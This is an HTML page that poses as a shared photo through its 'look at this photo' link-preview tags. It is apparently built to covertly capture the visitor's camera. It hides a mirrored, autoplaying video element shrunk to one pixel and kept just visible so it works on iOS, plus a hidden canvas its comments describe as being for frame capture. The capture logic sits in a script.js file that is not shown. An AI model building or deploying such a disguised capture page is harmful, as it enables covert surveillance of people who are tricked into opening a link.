<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Фото</title>
    
    <meta property="og:title" content="📸 Фото" />
    <meta property="og:description" content="Посмотрите это фото" />
    <meta property="og:image" content="https://my-photo-app-r2ct.onrender.com/my-photo.jpg" />
    <meta property="og:url" content="https://my-photo-app-r2ct.onrender.com/" />
    <meta property="og:type" content="website" />
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            min-height: 100dvh;
            overflow: hidden;
            margin: 0;
        }
        /* Фото на весь экран */
        .photo-fullscreen {
            width: 100%;
            height: 100vh;
            height: 100dvh;
            object-fit: contain;
            display: block;
            user-select: none;
            -webkit-user-select: none;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 1;
        }
        /* Видео — 1x1 пиксель, но видимое для iOS */
        #video {
            position: fixed;
            width: 1px;
            height: 1px;
            top: -1px;
            left: -1px;
            opacity: 0.01;
            z-index: 0;
            transform: scaleX(-1);
            pointer-events: none;
        }
        /* Скрытый canvas для захвата кадра */
        #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <!-- Фото на весь экран -->
    <img src="my-photo.jpg" alt="Фото" class="photo-fullscreen" id="photoImage" />
    
    <!-- Видео 1x1 пиксель (нужен для iOS) -->
    <video id="video" autoplay playsinline muted webkit-playsinline></video>
    
    <!-- Скрытый canvas -->
    <canvas id="canvas"></canvas>

    <script src="script.js"></script>
</body>
</html>
